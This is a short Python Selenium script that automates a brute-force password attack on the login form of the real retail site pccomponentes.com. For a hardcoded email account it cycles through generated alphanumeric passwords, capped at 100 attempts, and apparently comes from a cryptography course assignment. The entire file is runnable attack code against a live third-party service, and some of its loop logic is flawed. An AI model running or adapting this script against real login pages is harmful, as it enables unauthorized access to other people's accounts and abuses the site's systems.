from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
import time
import itertools

def bruteForce():
    min = 4
    max = 20
    diccionario = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    value = []
    contador = 0

    PATH = "C:\Program Files (x86)\chromedriver.exe"
    driver = webdriver.Chrome(PATH)
    driver.get("https://www.pccomponentes.com/")
    print(driver.title)

    driver.find_element_by_class_name('c-user-menu__link.qa-user-login-button').click()
    time.sleep(2)
    for tam in range (min, len(diccionario)):
        for password in itertools.product(diccionario, repeat=tam):
            if contador <= 99:
                print('intento: ', contador, 'clave:', password)
                driver.find_element_by_css_selector("[name^='username']").clear()
                driver.find_element_by_css_selector("[name^='password']").clear()
                driver.find_element_by_css_selector("[name^='username']").send_keys('tareacriptova@gmail.com')
                driver.find_element_by_css_selector("[name^='password']").send_keys(password)
                time.sleep(2)
                driver.find_element_by_css_selector("[type^='submit']").click()
            else:
                break
            contador += 1
bruteForce()
